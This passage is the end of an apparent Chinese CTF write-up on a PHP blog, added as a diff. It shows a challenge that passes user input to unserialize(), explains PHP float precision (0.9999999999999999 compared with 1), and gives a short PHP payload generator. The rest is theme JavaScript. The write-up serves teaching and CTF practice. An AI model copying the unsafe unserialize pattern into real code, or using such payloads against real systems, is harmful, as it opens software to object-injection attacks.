+<span class="nb">unserialize</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'trick'</span><span class="p">]);</span>
+</code></pre></div></div>
+
+<h3 id="考点-3">考点</h3>
+
+<ul>
+  <li>
+    <p><strong>浮点数精度问题导致的大小比较以及函数处理问题</strong></p>
+
+    <p>当小数小于10^-16后，PHP对于小数就大小不分了</p>
+
+    <p>var_dump(1.000000000000000 == 1) » TRUE</p>
+
+    <p>var_dump(1.0000000000000001 == 1) » TRUE</p>
+  </li>
+</ul>
+
+<h3 id="思路-4">思路</h3>
+
+<ul>
+  <li>
+    <p>本题所需要用到的是：0.9（17个9）后化为1，strlen判断为1</p>
+
+    <p>所以可以使trick1=1，trick2=0.9999999999999999</p>
+
+    <p>并且0.9999999999999999！= 1</p>
+
+    <p>md5(0.9999999999999999) == md5(1)</p>
+  </li>
+</ul>
+
+<h3 id="payload-3">payload</h3>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="kd">class</span> <span class="nc">trick</span><span class="p">{</span>
+    <span class="k">public</span> <span class="nv">$trick1</span> <span class="p">;</span>
+    <span class="k">public</span> <span class="nv">$trick2</span> <span class="p">;</span>
+<span class="p">}</span>
+
+<span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">trick</span><span class="p">();</span>
+<span class="nv">$a</span><span class="o">-&gt;</span><span class="n">trick1</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+<span class="nv">$a</span><span class="o">-&gt;</span><span class="n">trick2</span> <span class="o">=</span> <span class="mf">0.9999999999999999</span><span class="p">;</span>
+<span class="k">echo</span> <span class="nb">urlencode</span><span class="p">(</span><span class="nb">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">));</span>
+</code></pre></div></div>
+</div><section class="article__sharing d-print-none"></section><div class="d-print-none"><footer class="article__footer"><meta itemprop="dateModified" content="2020-08-26T00:20:23+08:00"><!-- start custom article footer snippet -->
+
+<!-- end custom article footer snippet -->
+<div class="article__subscribe"><div class="subscribe"><i class="fas fa-rss"></i> <a type="application/rss+xml" href="/feed.xml">Subscribe</a></div>
+</div><div class="article__license"><div class="license">
+    <p>This work is licensed under a <a itemprop="license" rel="license" href="https://creativecommons.org/licenses/by-nc/4.0/">Attribution-NonCommercial 4.0 International</a> license.
+      <a rel="license" href="https://creativecommons.org/licenses/by-nc/4.0/">
+        <img alt="Attribution-NonCommercial 4.0 International" src="https://i.creativecommons.org/l/by-nc/4.0/88x31.png" />
+      </a>
+    </p>
+  </div></div></footer>
+<div class="article__section-navigator clearfix"><div class="next"><span>NEXT</span><a href="/php/2020/09/11/sqlmap-%E8%A7%A3%E5%86%B3sqli-labs.html">sqlmap 解决 sqli-labs</a></div></div></div>
+
+</div>
+
+<script>(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    $(function() {
+      var $this ,$scroll;
+      var $articleContent = $('.js-article-content');
+      var hasSidebar = $('.js-page-root').hasClass('layout--page--sidebar');
+      var scroll = hasSidebar ? '.js-page-main' : 'html, body';
+      $scroll = $(scroll);
+
+      $articleContent.find('.highlight').each(function() {
+        $this = $(this);
+        $this.attr('data-lang', $this.find('code').attr('data-lang'));
+      });
+      $articleContent.find('h1[id], h2[id], h3[id], h4[id], h5[id], h6[id]').each(function() {
+        $this = $(this);
+        $this.append($('<a class="anchor d-print-none" aria-hidden="true"></a>').html('<i class="fas fa-anchor"></i>'));
+      });
+      $articleContent.on('click', '.anchor', function() {
+        $scroll.scrollToAnchor('#' + $(this).parent().attr('id'), 400);
+      });
+    });
+  });
+})();
+</script>
+</div><section class="page__comments d-print-none"></section></article><!-- start custom main bottom snippet -->
+
+<!-- end custom main bottom snippet -->
+</div>
+            </div></div></div><div class="page__footer d-print-none">
+<footer class="footer py-4 js-page-footer">
+  <div class="main"><div itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="DumKiy"><meta itemprop="url" content="/"><meta itemprop="description" content="Watch And Learn."><div class="footer__author-links"><div class="author-links">
+  <ul class="menu menu--nowrap menu--inline"><li title="Follow me on Github.">
+        <a class="button button--circle github-button" itemprop="sameAs" href="https://github.com/DummyKitty" target="_blank">
+          <div class="icon"><svg fill="#000000" width="24px" height="24px" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path class="svgpath" data-index="path_0" fill="#272636" d="M0 525.2c0 223.6 143.3 413.7 343 483.5 26.9 6.8 22.8-12.4 22.8-25.4l0-88.7c-155.3 18.2-161.5-84.6-172-101.7-21.1-36-70.8-45.2-56-62.3 35.4-18.2 71.4 4.6 113.1 66.3 30.2 44.7 89.1 37.2 119 29.7 6.5-26.9 20.5-50.9 39.7-69.6C248.8 728.2 181.7 630 181.7 513.2c0-56.6 18.7-108.7 55.3-150.7-23.3-69.3 2.2-128.5 5.6-137.3 66.5-6 135.5 47.6 140.9 51.8 37.8-10.2 80.9-15.6 129.1-15.6 48.5 0 91.8 5.6 129.8 15.9 12.9-9.8 77-55.8 138.8-50.2 3.3 8.8 28.2 66.7 6.3 135 37.1 42.1 56 94.6 56 151.4 0 117-67.5 215.3-228.8 243.7 26.9 26.6 43.6 63.4 43.6 104.2l0 128.8c0.9 10.3 0 20.5 17.2 20.5C878.1 942.4 1024 750.9 1024 525.3c0-282.9-229.3-512-512-512C229.1 13.2 0 242.3 0 525.2L0 525.2z" />
+</svg>
+</div>
+        </a>
+      </li></ul>
+</div>
+</div>
+    </div><div class="site-info mt-2">
+      <div>© DumKiy's blog 2021,
+        Powered by <a title="Jekyll is a simple, blog-aware, static site generator." href="http://jekyllrb.com/">Jekyll</a> & <a
+        title="TeXt is a super customizable Jekyll theme." href="https://github.com/kitian616/jekyll-TeXt-theme">TeXt Theme</a>.
+      </div>
+    </div>
+  </div>
+</footer>
+</div></div>
+    </div><script>(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    var $body = $('body'), $window = $(window);
+    var $pageRoot = $('.js-page-root'), $pageMain = $('.js-page-main');
+    var activeCount = 0;
+    function modal(options) {
+      var $root = this, visible, onChange, hideWhenWindowScroll = false;
+      var scrollTop;
+      function setOptions(options) {
+        var _options = options || {};
+        visible = _options.initialVisible === undefined ? false : show;
+        onChange = _options.onChange;
+        hideWhenWindowScroll = _options.hideWhenWindowScroll;
+      }
+      function init() {
+        setState(visible);
+      }
+      function setState(isShow) {
+        if (isShow === visible) {
+          return;
+        }
+        visible = isShow;
+        if (visible) {
+          activeCount++;
+          scrollTop = $(window).scrollTop() || $pageMain.scrollTop();
+          $root.addClass('modal--show');
+          $pageMain.scrollTop(scrollTop);
+          activeCount === 1 && ($pageRoot.addClass('show-modal'), $body.addClass('of-hidden'));
+          hideWhenWindowScroll && window.hasEvent('touchstart') && $window.on('scroll', hide);
+          $window.on('keyup', handleKeyup);
+        } else {
+          activeCount > 0 && activeCount--;
+          $root.removeClass('modal--show');
+          $window.scrollTop(scrollTop);
+          activeCount === 0 && ($pageRoot.removeClass('show-modal'), $body.removeClass('of-hidden'));
+          hideWhenWindowScroll && window.hasEvent('touchstart') && $window.off('scroll', hide);
+          $window.off('keyup', handleKeyup);
+        }
+        onChange && onChange(visible);
+      }
+      function show() {
+        setState(true);
+      }
+      function hide() {
+        setState(false);
+      }
+      function handleKeyup(e) {
+        // Char Code: 27  ESC
+        if (e.which ===  27) {
+          hide();
+        }
+      }
+      setOptions(options);
+      init();
+      return {
+        show: show,
+        hide: hide,
+        $el: $root
+      };
+    }
+    $.fn.modal = modal;
+  });
+})();
+</script><div class="modal modal--overflow page__search-modal d-print-none js-page-search-modal"><script>
+(function () {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    // search panel
+    var search = (window.search || (window.search = {}));
+    var useDefaultSearchBox = window.useDefaultSearchBox === undefined ?
+      true : window.useDefaultSearchBox ;
+
+    var $searchModal = $('.js-page-search-modal');
+    var $searchToggle = $('.js-search-toggle');
+    var searchModal = $searchModal.modal({ onChange: handleModalChange, hideWhenWindowScroll: true });
+    var modalVisible = false;
+    search.searchModal = searchModal;
+
+    var $searchBox = null;
+    var $searchInput = null;
+    var $searchClear = null;
+
+    function getModalVisible() {
+      return modalVisible;
+    }
+    search.getModalVisible = getModalVisible;
+
+    function handleModalChange(visible) {
+      modalVisible = visible;
+      if (visible) {
+        search.onShow && search.onShow();
+        useDefaultSearchBox && $searchInput[0] && $searchInput[0].focus();
+      } else {
+        search.onShow && search.onHide();
+        useDefaultSearchBox && $searchInput[0] && $searchInput[0].blur();
+        setTimeout(function() {
+          useDefaultSearchBox && ($searchInput.val(''), $searchBox.removeClass('not-empty'));
+          search.clear && search.clear();
+          window.pageAsideAffix && window.pageAsideAffix.refresh();
+        }, 400);
+      }
+    }
+
+    $searchToggle.on('click', function() {
+      modalVisible ? searchModal.hide() : searchModal.show();
+    });
+    // Char Code: 83  S, 191 /
+    $(window).on('keyup', function(e) {
+      if (!modalVisible && !window.isFormElement(e.target || e.srcElement) && (e.which === 83 || e.which === 191)) {
+        modalVisible || searchModal.show();
+      }
+    });
+
+    if (useDefaultSearchBox) {
+      $searchBox = $('.js-search-box');
+      $searchInput = $searchBox.children('input');
+      $searchClear = $searchBox.children('.js-icon-clear');
+      search.getSearchInput = function() {
+        return $searchInput.get(0);
+      };
+      search.getVal = function() {
+        return $searchInput.val();
+      };
+      search.setVal = function(val) {
+        $searchInput.val(val);
+      };
+
+      $searchInput.on('focus', function() {
+        $(this).addClass('focus');
+      });
+      $searchInput.on('blur', function() {
+        $(this).removeClass('focus');
+      });
+      $searchInput.on('input', window.throttle(function() {
+        var val = $(this).val();
+        if (val === '' || typeof val !== 'string') {
+          search.clear && search.clear();
+        } else {
+          $searchBox.addClass('not-empty');
+          search.onInputNotEmpty && search.onInputNotEmpty(val);
+        }
+      }, 400));
+      $searchClear.on('click', function() {
+        $searchInput.val(''); $searchBox.removeClass('not-empty');
+        search.clear && search.clear();
+      });
+    }
+  });
+})();
+</script><div class="search search--dark">
+  <div class="main">
+    <div class="search__header">Search</div>
+    <div class="search-bar">
+      <div class="search-box js-search-box">
+        <div class="search-box__icon-search"><i class="fas fa-search"></i></div>
+        <input type="text" />
+        <div class="search-box__icon-clear js-icon-clear">
+          <a><i class="fas fa-times"></i></a>
+        </div>
+      </div>
+      <button class="button button--theme-dark button--pill search__cancel js-search-toggle">
+        Cancel</button>
+    </div>
+    <div class="search-result js-search-result"></div>
+  </div>
+</div>
+<script>var SOURCES = window.TEXT_VARIABLES.sources;
+var PAHTS = window.TEXT_VARIABLES.paths;
+window.Lazyload.js([SOURCES.jquery, PAHTS.search_js], function() {
+  var search = (window.search || (window.search = {}));
+  var searchData = window.TEXT_SEARCH_DATA || {};
+
+  function memorize(f) {
+    var cache = {};
+    return function () {
+      var key = Array.prototype.join.call(arguments, ',');
+      if (key in cache) return cache[key];
+      else return cache[key] = f.apply(this, arguments);
+    };
+  }
+
+  /// search
+  function searchByQuery(query) {
+    var i, j, key, keys, cur, _title, result = {};
+    keys = Object.keys(searchData);
+    for (i = 0; i < keys.length; i++) {
+      key = keys[i];
+      for (j = 0; j < searchData[key].length; j++) {
+        cur = searchData[key][j], _title = cur.title;
+        if ((result[key] === undefined || result[key] && result[key].length < 4 )
+          && _title.toLowerCase().indexOf(query.toLowerCase()) >= 0) {
+          if (result[key] === undefined) {
+            result[key] = [];
+          }
+          result[key].push(cur);
+        }
+      }
+    }
+    return result;
+  }
+
+  var renderHeader = memorize(function(header) {
+    return $('<p class="search-result__header">' + header + '</p>');
+  });
+
+  var renderItem = function(index, title, url) {
+    return $('<li class="search-result__item" data-index="' + index + '"><a class="button" href="' + url + '">' + title + '</a></li>');
+  };
+
+  function render(data) {
+    if (!data) { return null; }
+    var $root = $('<ul></ul>'), i, j, key, keys, cur, itemIndex = 0;
+    keys = Object.keys(data);
+    for (i = 0; i < keys.length; i++) {
+      key = keys[i];
+      $root.append(renderHeader(key));
+      for (j = 0; j < data[key].length; j++) {
+        cur = data[key][j];
+        $root.append(renderItem(itemIndex++, cur.title, cur.url));
+      }
+    }
+    return $root;
+  }
+
+  // search box
+  var $result = $('.js-search-result'), $resultItems;
+  var lastActiveIndex, activeIndex;
+
+  function clear() {
+    $result.html(null);
+    $resultItems = $('.search-result__item'); activeIndex = 0;
+  }
+  function onInputNotEmpty(val) {
+    $result.html(render(searchByQuery(val)));
+    $resultItems = $('.search-result__item'); activeIndex = 0;
+    $resultItems.eq(0).addClass('active');
+  }
+
+  search.clear = clear;
+  search.onInputNotEmpty = onInputNotEmpty;
+
+  function updateResultItems() {
+    lastActiveIndex >= 0 && $resultItems.eq(lastActiveIndex).removeClass('active');
+    activeIndex >= 0 && $resultItems.eq(activeIndex).addClass('active');
+  }
+
+  function moveActiveIndex(direction) {
+    var itemsCount = $resultItems ? $resultItems.length : 0;
+    if (itemsCount > 1) {
+      lastActiveIndex = activeIndex;
+      if (direction === 'up') {
+        activeIndex = (activeIndex - 1 + itemsCount) % itemsCount;
+      } else if (direction === 'down') {
+        activeIndex = (activeIndex + 1 + itemsCount) % itemsCount;
+      }
+      updateResultItems();
+    }
+  }
+
+  // Char Code: 13  Enter, 37  ⬅, 38  ⬆, 39  ➡, 40  ⬇
+  $(window).on('keyup', function(e) {
+    var modalVisible = search.getModalVisible && search.getModalVisible();
+    if (modalVisible) {
+      if (e.which === 38) {
+        modalVisible && moveActiveIndex('up');
+      } else if (e.which === 40) {
+        modalVisible && moveActiveIndex('down');
+      } else if (e.which === 13) {
+        modalVisible && $resultItems && activeIndex >= 0 && $resultItems.eq(activeIndex).children('a')[0].click();
+      }
+    }
+  });
+
+  $result.on('mouseover', '.search-result__item > a', function() {
+    var itemIndex = $(this).parent().data('index');
+    itemIndex >= 0 && (lastActiveIndex = activeIndex, activeIndex = itemIndex, updateResultItems());
+  });
+});
+</script>
+</div></div>
+
+
+<script>(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    function scrollToAnchor(anchor, duration, callback) {
+      var $root = this;
+      $root.animate({ scrollTop: $(anchor).position().top }, duration, function() {
+        window.history.replaceState(null, '', window.location.href.split('#')[0] + anchor);
+        callback && callback();
+      });
+    }
+    $.fn.scrollToAnchor = scrollToAnchor;
+  });
+})();
+(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    function affix(options) {
+      var $root = this, $window = $(window), $scrollTarget, $scroll,
+        offsetBottom = 0, scrollTarget = window, scroll = window.document, disabled = false, isOverallScroller = true,
+        rootTop, rootLeft, rootHeight, scrollBottom, rootBottomTop,
+        hasInit = false, curState;
+
+      function setOptions(options) {
+        var _options = options || {};
+        _options.offsetBottom && (offsetBottom = _options.offsetBottom);
+        _options.scrollTarget && (scrollTarget = _options.scrollTarget);
+        _options.scroll && (scroll = _options.scroll);
+        _options.disabled !== undefined && (disabled = _options.disabled);
+        $scrollTarget = $(scrollTarget);
+        isOverallScroller = window.isOverallScroller($scrollTarget[0]);
+        $scroll = $(scroll);
+      }
+      function preCalc() {
+        top();
+        rootHeight = $root.outerHeight();
+        rootTop = $root.offset().top + (isOverallScroller ? 0 :  $scrollTarget.scrollTop());
+        rootLeft = $root.offset().left;
+      }
+      function calc(needPreCalc) {
+        needPreCalc && preCalc();
+        scrollBottom = $scroll.outerHeight() - offsetBottom - rootHeight;
+        rootBottomTop = scrollBottom - rootTop;
+      }
+      function top() {
+        if (curState !== 'top') {
+          $root.removeClass('fixed').css({
+            left: 0,
+            top: 0
+          });
+          curState = 'top';
+        }
+      }
+      function fixed() {
+        if (curState !== 'fixed') {
+          $root.addClass('fixed').css({
+            left: rootLeft + 'px',
+            top: 0
+          });
+          curState = 'fixed';
+        }
+      }
+      function bottom() {
+        if (curState !== 'bottom') {
+          $root.removeClass('fixed').css({
+            left: 0,
+            top: rootBottomTop + 'px'
+          });
+          curState = 'bottom';
+        }
+      }
+      function setState() {
+        var scrollTop = $scrollTarget.scrollTop();
+        if (scrollTop >= rootTop && scrollTop <= scrollBottom) {
+          fixed();
+        } else if (scrollTop < rootTop) {
+          top();
+        } else {
+          bottom();
+        }
+      }
+      function init() {
+        if(!hasInit) {
+          var interval, timeout;
+          calc(true); setState();
+          // run calc every 100 millisecond
+          interval = setInterval(function() {
+            calc();
+          }, 100);
+          timeout = setTimeout(function() {
+            clearInterval(interval);
+          }, 45000);
+          window.pageLoad.then(function() {
+            setTimeout(function() {
+              clearInterval(interval);
+              clearTimeout(timeout);
+            }, 3000);
+          });
+          $scrollTarget.on('scroll', function() {
+            disabled || setState();
+          });
+          $window.on('resize', function() {
+            disabled || (calc(true), setState());
+          });
+          hasInit = true;
+        }
+      }
+
+      setOptions(options);
+      if (!disabled) {
+        init();
+      }
+      $window.on('resize', window.throttle(function() {
+        init();
+      }, 200));
+      return {
+        setOptions: setOptions,
+        refresh: function() {
+          calc(true, { animation: false }); setState();
+        }
+      };
+    }
+    $.fn.affix = affix;
+  });
+})();
+(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    function toc(options) {
+      var $root = this, $window = $(window), $scrollTarget, $scroller, $tocUl = $('<ul class="toc toc--ellipsis"></ul>'), $tocLi, $headings, $activeLast, $activeCur,
+        selectors = 'h1,h2,h3', container = 'body', scrollTarget = window, scroller = 'html, body', disabled = false,
+        headingsPos, scrolling = false, hasRendered = false, hasInit = false;
+
+      function setOptions(options) {
+        var _options = options || {};
+        _options.selectors && (selectors = _options.selectors);
+        _options.container && (container = _options.container);
+        _options.scrollTarget && (scrollTarget = _options.scrollTarget);
+        _options.scroller && (scroller = _options.scroller);
+        _options.disabled !== undefined && (disabled = _options.disabled);
+        $headings = $(container).find(selectors).filter('[id]');
+        $scrollTarget = $(scrollTarget);
+        $scroller = $(scroller);
+      }
+      function calc() {
+        headingsPos = [];
+        $headings.each(function() {
+          headingsPos.push(Math.floor($(this).position().top));
+        });
+      }
+      function setState(element, disabled) {
+        var scrollTop = $scrollTarget.scrollTop(), i;
+        if (disabled || !headingsPos || headingsPos.length < 1) { return; }
+        if (element) {
+          $activeCur = element;
+        } else {
+          for (i = 0; i < headingsPos.length; i++) {
+            if (scrollTop >= headingsPos[i]) {
+              $activeCur = $tocLi.eq(i);
+            } else {
+              $activeCur || ($activeCur = $tocLi.eq(i));
+              break;
+            }
+          }
+        }
+        $activeLast && $activeLast.removeClass('active');
+        ($activeLast = $activeCur).addClass('active');
+      }
+      function render() {
+        if(!hasRendered) {
+          $root.append($tocUl);
+          $headings.each(function() {
+            var $this = $(this);
+            $tocUl.append($('<li></li>').addClass('toc-' + $this.prop('tagName').toLowerCase())
+              .append($('<a></a>').text($this.text()).attr('href', '#' + $this.prop('id'))));
+          });
+          $tocLi = $tocUl.children('li');
+          $tocUl.on('click', 'a', function(e) {
+            e.preventDefault();
+            var $this = $(this);
+            scrolling = true;
+            setState($this.parent());
+            $scroller.scrollToAnchor($this.attr('href'), 400, function() {
+              scrolling = false;
+            });
+          });
+        }
+        hasRendered = true;
+      }
+      function init() {
+        var interval, timeout;
+        if(!hasInit) {
+          render(); calc(); setState(null, scrolling);
+          // run calc every 100 millisecond
+          interval = setInterval(function() {
+            calc();
+          }, 100);
+          timeout = setTimeout(function() {
+            clearInterval(interval);
+          }, 45000);
+          window.pageLoad.then(function() {
+            setTimeout(function() {
+              clearInterval(interval);
+              clearTimeout(timeout);
+            }, 3000);
+          });
+          $scrollTarget.on('scroll', function() {
+            disabled || setState(null, scrolling);
+          });
+          $window.on('resize', window.throttle(function() {
+            if (!disabled) {
+              render(); calc(); setState(null, scrolling);
+            }
+          }, 100));
+        }
+        hasInit = true;
+      }
+
+      setOptions(options);
+      if (!disabled) {
+        init();
+      }
+      $window.on('resize', window.throttle(function() {
+        init();
+      }, 200));
+      return {
+        setOptions: setOptions
+      };
+    }
+    $.fn.toc = toc;
+  });
+})();
+/*(function () {
+
+})();*/
+</script><script>
+  /* toc must before affix, since affix need to konw toc' height. */(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  var TOC_SELECTOR = window.TEXT_VARIABLES.site.toc.selectors;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    var $window = $(window);
+    var $articleContent = $('.js-article-content');
+    var $tocRoot = $('.js-toc-root'), $col2 = $('.js-col-aside');
+    var toc;
+    var tocDisabled = false;
+    var hasSidebar = $('.js-page-root').hasClass('layout--page--sidebar');
+    var hasToc = $articleContent.find(TOC_SELECTOR).length > 0;
+
+    function disabled() {
+      return $col2.css('display') === 'none' || !hasToc;
+    }
+
+    tocDisabled = disabled();
+
+    toc = $tocRoot.toc({
+      selectors: TOC_SELECTOR,
+      container: $articleContent,
+      scrollTarget: hasSidebar ? '.js-page-main' : null,
+      scroller: hasSidebar ? '.js-page-main' : null,
+      disabled: tocDisabled
+    });
+
+    $window.on('resize', window.throttle(function() {
+      tocDisabled = disabled();
+      toc && toc.setOptions({
+        disabled: tocDisabled
+      });
+    }, 100));
+
+  });
+})();
+(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    var $window = $(window), $pageFooter = $('.js-page-footer');
+    var $pageAside = $('.js-page-aside');
+    var affix;
+    var tocDisabled = false;
+    var hasSidebar = $('.js-page-root').hasClass('layout--page--sidebar');
+
+    affix = $pageAside.affix({
+      offsetBottom: $pageFooter.outerHeight(),
+      scrollTarget: hasSidebar ? '.js-page-main' : null,
+      scroller: hasSidebar ? '.js-page-main' : null,
+      scroll: hasSidebar ? $('.js-page-main').children() : null,
+      disabled: tocDisabled
+    });
+
+    $window.on('resize', window.throttle(function() {
+      affix && affix.setOptions({
+        disabled: tocDisabled
+      });
+    }, 100));
+
+    window.pageAsideAffix = affix;
+  });
+})();
+</script><script>
+  window.Lazyload.js(['https://cdn.bootcss.com/jquery/3.1.1/jquery.min.js', 'https://cdn.bootcss.com/Chart.js/2.7.2/Chart.bundle.min.js'], function() {
+    var $canvas = null, $this = null, _ctx = null, _text = '';
+    $('.language-chart').each(function(){
+      $this = $(this);
+      $canvas = $('<canvas></canvas>');
+      _text = $this.text();
+      $this.text('').append($canvas);
+      _ctx = $canvas.get(0).getContext('2d');
+      (_ctx && _text) && (new Chart(_ctx, JSON.parse(_text)) && $this.attr('data-processed', true));
+    });
+  });
+</script>
+<script type="text/x-mathjax-config">
+	var _config = { tex2jax: {
+		inlineMath: [['$','$'], ['\\(','\\)']]
+	}};_config.TeX = { equationNumbers: { autoNumber: "all" } };MathJax.Hub.Config(_config);
+</script>
+<script type="text/javascript" src="https://cdn.bootcss.com/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML" async></script>
+<script>
+  window.Lazyload.js('https://cdn.bootcss.com/mermaid/8.0.0-rc.8/mermaid.min.js', function() {
+    mermaid.initialize({
+      startOnLoad: true
+    });
+    mermaid.init(undefined, '.language-mermaid');
+  });
+</script>
+
+    </div>
+    <script>(function () {
+  var $root = document.getElementsByClassName('root')[0];
+  if (window.hasEvent('touchstart')) {
+    $root.dataset.isTouch = true;
+    document.addEventListener('touchstart', function(){}, false);
+  }
+})();
+</script>
+  </body>
+</html>
+
